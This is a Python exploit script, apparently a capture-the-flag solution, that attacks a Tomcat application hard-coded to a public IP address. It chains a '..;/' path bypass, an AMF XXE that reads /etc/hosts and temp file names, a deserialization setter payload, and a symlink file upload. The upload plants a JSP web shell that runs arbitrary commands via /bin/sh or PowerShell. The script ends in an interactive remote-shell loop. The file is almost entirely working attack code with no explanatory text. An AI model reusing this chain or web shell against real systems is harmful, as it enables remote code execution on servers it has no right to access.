import requests
import os
import threading
import subprocess
import time
import sys

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


proxy = {
	"http": "http://127.0.0.1:8888",
	"https" : "http://127.0.0.1:8888", 
}

def excute_subprocess(list_cmd):
	p = subprocess.Popen(list_cmd,stdout=subprocess.PIPE, stderr=subprocess.PIPE)	
	out, err = p.communicate()
	return out,err


def generate_amf_setter_payload(filePath):
    os.system("java -cp amfGenerator.jar base.peterjson.Main \"%s\"" % filePath)

def trigger_setter(url):
    burp0_url = url + "/tetctf/abc/..;/messagebroker/amf"
    data = open("pocAMF1.ser","rb")
    r = requests.post(burp0_url, data=data,proxies=proxy)
    print(r.content)
    

def trigger_amf_xxe(url,method):
    try:
      out,err = excute_subprocess(["python","amf_xxe.py","%s/tetctf/abc/..;/messagebroker/amf" % url,"foo","%s" % method])
      out = out.split("peterjson/")[1].strip()
      print("%s output: " % method)
      print(out)
      return out
    except:
      pass


def _get_jsp():
    jsp = """<%@ page import="java.util.*,java.io.*"%>
<%
    String command = request.getParameter("cmd");
    if (command != null) {
        ProcessBuilder process = new ProcessBuilder();
        if(System.getProperty("os.name").toLowerCase().startsWith("windows")){
            process.command("powershell.exe","-c",command);
        } else {
            process.command("/bin/sh","-c", command);
        }
        process.redirectErrorStream(true);
        Process p = process.start();
        InputStreamReader inputStreamReader = new InputStreamReader(p.getInputStream());
        BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
        String line = "";
        String output = "";
        while((line = bufferedReader.readLine()) != null){
            output = output + line + "\\n";
        }
        out.println(output);
        response.setStatus(404);
    } else{
        response.setStatus(404);
    }
%>"""
    return jsp


def upload_via_symlink(url):
    burp0_url = url + "/tetctf/uploadServlet?filePath=/tmp/backup13337/peterjson"
    files = {'dummy': _get_jsp()}
    r = requests.post(burp0_url, files=files,proxies=proxy)
    print(r.content)

def exec_cmd(url,cmd):
    burp0_url = url + "/tetctf/peterjson.jsp"
    burp0_cookies = {"JSESSIONID": "578A28D99AAE35BCA1D5E8C9339D9145"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded"}
    burp0_data = {"cmd": cmd}
    r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
    print(r.content)

def run_cmd(url,cmd):
    if "quit" in cmd:
      print("Exiting ...")
      sys.exit(-1)
    else:
      return exec_cmd(url,cmd)

if __name__ == '__main__':
    # url = "http://192.168.111.202:1337"
    url = "http://139.162.40.239:13337"
    print("[+] trigger_amf_xxe etc_hosts")
    trigger_amf_xxe(url,"etc_hosts")
    time.sleep(1)
    print("[+] trigger_amf_xxe trigger_jar_xxe")
    t = threading.Thread(target=trigger_amf_xxe, args=((url,"trigger_jar_xxe")))
    t.start()
    time.sleep(1)
    print("[+] trigger_amf_xxe get_tmp_filename")
    tmp_file = trigger_amf_xxe(url,"get_tmp_filename").split("\n")[0].strip()
    print("[+] tmp filename: " + tmp_file)
    time.sleep(1)
    print("[+] generate_amf_setter_payload")
    generate_amf_setter_payload("/home/service/apache-tomcat-7.0.99/temp/" + tmp_file)
    print("[+] trigger_setter")
    trigger_setter(url)
    time.sleep(1)
    print("[+] upload_via_symlink")
    upload_via_symlink(url)
    print("[+] done, enjoy shell")

    while True:
			cmd = raw_input("/peterjson@remote_shell/~.~\n").strip()
			output = run_cmd(url,cmd)
			print(output)
    

